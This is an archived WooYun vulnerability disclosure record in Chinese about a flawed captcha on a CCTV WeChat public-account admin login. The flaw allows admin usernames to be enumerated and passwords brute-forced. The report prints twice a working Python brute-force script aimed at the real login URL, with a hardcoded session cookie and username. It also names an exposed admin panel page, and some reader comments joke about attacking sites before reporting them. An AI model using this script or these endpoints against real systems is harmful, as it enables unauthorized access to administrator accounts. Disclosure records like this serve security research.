{"id": 73723, "wybug_id": "wooyun-2016-0173681", "wybug_title": "央视某重要系统设计缺陷导致可爆破(附爆破脚本)", "wybug_corp": "中国网络电视台", "wybug_author": "齐天大圣", "wybug_date": "2016-01-29 17:19", "wybug_open_date": "2016-02-03 17:20", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-03：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 年底了，听说要让三只搅屎棍上春晚，我说还不如让猴哥上。 详细说明：  存在漏洞的站点在央视公众号管理平台http://wx.cntv.cn/mp/login.html\n\n加上admin就是超级管理员后台\n\n这个地方的验证码设计是有缺陷的，导致可以爆破用户名和密码，先来尝试爆破几个用户名爆出的两位超级管理员用户名\n\n爆出的三位普通管理员\n\n普通管理员在超级管理员页面登录的时候会提示没有权限\n\n超级管理员则会提示输错密码\n\n密码部分是经过md5加密的\n\n编写爆破脚本测试之\n\n另外本平台本身也有些bug直接访问http://wx.cntv.cn/pannel.html，也是能一窥后台全貌的\n\n\n\n然而并没有用，只能算个bug。爆破脚本手里字典不够强大，没有爆破出来。可以换强大的字典尝试一下。需要抓包把cookie修改成你自己的，并且填入页面中显示的验证码。\n# -*- coding: utf-8 -*-import md5import requestsdef crypt( str ):\tm = md5.new()\tm.update(str)\treturn m.hexdigest()\ttarget = \"http://wx.cntv.cn/admin/login/invaild.html\"vcode = \"fxg5\"cookie = 'vjuids=-6fcdfeb6.15286b22d4b.0.ab75c7f36e7b; vjlast=1453958770.1453958770.30; wdcid=30aaf6ab9c552d55; __gads=ID=36e2fcc6c3d14393:T=1453958771:S=ALNI_MYmCxw1JJB4sbqHG9hq5TWja7AtBg; cntv_mail_usr=qq3131798654; m_cntv_app=; BLOG_NEW_cntv_sid=5uu5u5; PHPSESSID=j1pd7qfam7v8u7a78u5pnku1b5'headers = {\t'Host':'wx.cntv.cn',\t'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7',\t'Accept':'application/json, text/javascript, */*; q=0.01',\t'Content-Type':'application/x-www-form-urlencoded',\t'Referer':'http://wx.cntv.cn/admin/login.html',\t'Cookie':cookie,\t'Connection':'keep-alive'}dic = open('D:\\dic1.txt')for line in dic:\tpasswd = line.split(\"\\n\")[0]\tpasswd_hash = crypt( passwd )\tdata = {\"do_login\":\"true\",\t\t\"username\":\"lsz\",\t\t\"password\":passwd_hash,\t\t\"verifyCode\":vcode\t}\ttry:\t\tr = requests.post( target, data = data, headers= headers )\t\tif r.status_code == 200:\t\t\t#print r.text\t\t\tresult = r.json()\t\t\tif result[\"e\"] == \"9008\":\t\t\t\tprint u'%s %s\\t尝试:%s' % (  result[\"e\"], result[\"m\"], passwd )\t\t\telse:\t\t\t\tprint u'%s %s\\t尝试:%s' % (  result[\"e\"], result[\"m\"], passwd )\t\t\t\tbreak\texcept Exception, e:\t\tprint str(e)\n   漏洞证明：  存在漏洞的站点在央视公众号管理平台http://wx.cntv.cn/mp/login.html\n\n加上admin就是超级管理员后台\n\n这个地方的验证码设计是有缺陷的，导致可以爆破用户名和密码，先来尝试爆破几个用户名爆出的两位超级管理员用户名\n\n爆出的三位普通管理员\n\n普通管理员在超级管理员页面登录的时候会提示没有权限\n\n超级管理员则会提示输错密码\n\n密码部分是经过md5加密的\n\n编写爆破脚本测试之\n\n另外本平台本身也有些bug直接访问http://wx.cntv.cn/pannel.html，也是能一窥后台全貌的\n\n\n\n然而并没有用，只能算个bug。爆破脚本手里字典不够强大，没有爆破出来。可以换强大的字典尝试一下。需要抓包把cookie修改成你自己的，并且填入页面中显示的验证码。\n# -*- coding: utf-8 -*-import md5import requestsdef crypt( str ):\tm = md5.new()\tm.update(str)\treturn m.hexdigest()\ttarget = \"http://wx.cntv.cn/admin/login/invaild.html\"vcode = \"fxg5\"cookie = 'vjuids=-6fcdfeb6.15286b22d4b.0.ab75c7f36e7b; vjlast=1453958770.1453958770.30; wdcid=30aaf6ab9c552d55; __gads=ID=36e2fcc6c3d14393:T=1453958771:S=ALNI_MYmCxw1JJB4sbqHG9hq5TWja7AtBg; cntv_mail_usr=qq3131798654; m_cntv_app=; BLOG_NEW_cntv_sid=5uu5u5; PHPSESSID=j1pd7qfam7v8u7a78u5pnku1b5'headers = {\t'Host':'wx.cntv.cn',\t'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7',\t'Accept':'application/json, text/javascript, */*; q=0.01',\t'Content-Type':'application/x-www-form-urlencoded',\t'Referer':'http://wx.cntv.cn/admin/login.html',\t'Cookie':cookie,\t'Connection':'keep-alive'}dic = open('D:\\dic1.txt')for line in dic:\tpasswd = line.split(\"\\n\")[0]\tpasswd_hash = crypt( passwd )\tdata = {\"do_login\":\"true\",\t\t\"username\":\"lsz\",\t\t\"password\":passwd_hash,\t\t\"verifyCode\":vcode\t}\ttry:\t\tr = requests.post( target, data = data, headers= headers )\t\tif r.status_code == 200:\t\t\t#print r.text\t\t\tresult = r.json()\t\t\tif result[\"e\"] == \"9008\":\t\t\t\tprint u'%s %s\\t尝试:%s' % (  result[\"e\"], result[\"m\"], passwd )\t\t\telse:\t\t\t\tprint u'%s %s\\t尝试:%s' % (  result[\"e\"], result[\"m\"], passwd )\t\t\t\tbreak\texcept Exception, e:\t\tprint str(e)\n   修复方案：  1.重新修改验证码逻辑2.对后台敏感页面稍微做一些限制3.真的不考虑我猴哥吗   版权声明：转载请注明来源 齐天大圣@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-02-03 17:20 厂商回复：  漏洞Rank：8  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-29 17:24 |    \t\tking7 \t\t\t( 普通白帽子  |\t\t\t        Rank:1617 漏洞数:231        | 乱花渐欲迷人眼)\t\t \n  你不要黑三小只，他们高烧200°还在坚持用一个小时的时间来跑800米...    \n     2016-01-29 17:39 |    \t\tX4car \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:12        | 瓦塔西瓦路飞的四)\t\t \n  @king7 你也是四叶草啊，终于找打自己人了。等我把这堆粪舔完，要不要来一起日站。    \n     2016-01-29 18:35 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:201 漏洞数:67        | 微信公众号：233sec  不定期分享各种漏洞思...)\t\t \n  我觉得提交wooyun不如自己先玩玩啊。。。    \n     2016-01-29 19:10 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1361 漏洞数:195        | 。)\t\t \n  可怕楼上这么多四叶草的？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}